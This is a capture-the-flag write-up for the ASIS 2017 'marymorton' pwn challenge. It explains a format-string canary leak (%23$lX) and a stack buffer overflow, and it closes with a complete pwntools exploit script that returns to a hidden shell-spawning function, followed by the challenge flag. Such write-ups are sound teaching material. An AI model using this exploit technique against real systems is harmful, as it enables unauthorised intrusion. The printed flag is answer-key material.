---
layout: post
title: Asis 2017 marymorton
date: 2025-07-04 16:32:02 +0300
categories: Nightmare-series ret2system
tags: nightmare buffer-overflow x64 leak-canary ROP stack-canary ret2win
---

## Information 
- Category: Pwn
- Points: 43

## Description
> Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him!

## Write-up
Running the program produces the following output:
```bash
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
```
The program allows you to select a vulnerability to exploit — which is pretty cool!



Now let’s get the basic info from the program:
```bash
checksec --file=./mary_morton
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```
The program has some **mitigations** like **NX enabled** and a **stack canary**. Keep this in mind.
> **Stack canary** is present, which protects against simple stack overflows.
**NX (No eXecute)** is enabled, so we can't execute code on the stack.
{: .prompt-info}

There are **two functions** that can be called based on your **choice**:
<img src="/images/marymorton/rev-function.png" style="border-radius: 14px;">

The first function has a format string vulnerability — but how?
You can see that it takes your input and passes it directly to ```printf``` without a **format string**.
This makes it vulnerable! You can use it to **read** or **write** memory, which makes it a very powerful vulnerability.
<img src="/images/marymorton/rev-fmtstr.png" style="border-radius: 14px;">


> **Leak memory** using format specifiers like **%x**, **%s**, or **%p**.
{: .prompt-tip}
> **Write to memory** using **%n**
{: .prompt-info}



The second function has a **stack buffer overflow** vulnerability.
It uses ```read()``` with a size of ```0x100```, which allows you to overflow the buffer and control the return address.
This means you can overwrite the return address and **redirect execution wherever you want**.
<img src="/images/marymorton/rev-buffoverflow.png" style="border-radius: 14px;">

I found the ```system``` function in the **GOT/PLT** section — and that’s very important!
Since the binary is **stripped** and has **no PIE**, we can use its fixed address later in the exploit.
But wait — ```system``` isn’t used in ```main```, so why is it in the program?
You can use tools like ```xref``` to see where it’s called from.
And boom — there’s a **hidden function** that runs ```system("/bin/sh")``` and gives a shell!
Now, we just need to **call it**.
<img src="/images/marymorton/hidden-func.png" style="border-radius: 14px;">

To bypass the **stack canary**, we need two things:

- The **offset** from the buffer to the canary and return address

- The **leaked canary value**

Since we have a **format string vulnerability**, we can leak the canary from the stack.
Once we know the offset and the canary value, we can **overwrite the stack safely**, pass the canary check, and then **return to the hidden function** that gives us a shell.


> Use ```pwndbg``` to find the offset between the buffer, the canary, and the return address.
{: .prompt-tip}

To calculate the offset between the buffer and the canary:

- The **buffer** is at ```rbp - 0x98```

- The **canary** is at ```rbp - 0x10```

So we need ```0x98 - 0x10 = 0x88``` **bytes** to reach the canary.
Then, we need **8 more bytes** to reach the return **address** (after the canary).
<img src="/images/marymorton/layout-bugbof.png" style="border-radius: 14px;">

find the **canary’s offset in memory**, set a breakpoint at the start of the ```fmtstrBug``` function — specifically at ```0x4008f6```:
```nasm
   0x4008ef    SUB    RSP,0x90
          
          
   0x4008f6    MOV    RAX,qword ptr FS:[0x28]
          

```
> This line moves the canary value from ```FS:[0x28]``` into ```RAX```.
{: .prompt-info}

Then step forward using ```ni``` (next instruction):
```bash
pwndbg> ni
0x0000000000400903 in ?? ()
.
.
.
pwndbg> p/x $rax
$2 = 0xb145368bea2f6300
pwndbg> 
```
Now, set a breakpoint at the ```printf``` call inside the ```fmtstrBug``` function to find the **canary’s offset in the stack**:
```bash
pwndbg> c
Continuing.
Breakpoint 1, 0x0000000000400944 in ?? ()
*RIP  0x400944 ◂— call printf@plt
► 0x400944    call   printf@plt
```

Then check the stack: 
```
pwndbg> stack
00:0000│ rdi rsi rsp 0x7fffffffde80 ◂— '%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.\n'
...
11:0088│-008 0x7fffffffdf08 ◂— 0xb145368bea2f6300  ← This is the canary!
```
Then continue to see the actual output from ```printf```:
```
pwndbg> c
Continuing.
7FFFFFFFDE80.35.7FFFFFFFDF20.0.0.2E586C25...
```
> 1st rdi | 2nd rsi | 3rd rdx | 4th rcx | 5th r8 | 6th r9 | then stack
{: .prompt-tip}
The **canary** is located at ```0x88``` bytes above the base of the buffer on the stack:
```
 11:0088│-008 0x7fffffffdf08 ◂— 0xb145368bea2f6300  ← canary
```
Since each step in a format string leak like ```%lx``` reads **8 bytes** (64 bits), we calculate:
```
0x88 / 0x8 = 17
```
So it takes **17 stack slots** to reach the canary after the format string arguments begin.

In x64, the first **6 arguments** to ```printf()``` are passed in registers (```rdi```, ```rsi```, ```rdx```, etc.). Format string values start on the stack **after those**.

Final result:
```
17 (stack positions to canary) + 6 (register args) = 23
```
So the **canary is at offset** ```%23$lx``` in the format string!
```bash
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
2
%23$lX
EF2CFA8399681700
```

## Exploit

```python

#!/usr/bin/env python3

from pwn import *

exe = ELF("./mary_morton")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1000)

    return r

def leakCanary(r):
    r.recvuntil("Exit the battle \n")
    r.sendline(b"2")
    
    fmtstr = b"%23$lX"
    
    r.sendline(fmtstr)
    canary = int(r.recvline().decode(),16)

    log.success(f"Canary Leak:{hex(canary)}")

    return canary

def main():
    r = conn()

    hiddenFunc = 0x4008da
    ret = 0x400659
    canary = leakCanary(r)

    payload = b"A"*0x88
    payload+= p64(canary)
    payload+= b"B"*0x8
    payload+= p64(ret)
    payload+= p64(hiddenFunc)

    r.sendline(b"1")
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()

```

## Flag
Flag: ```ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}```
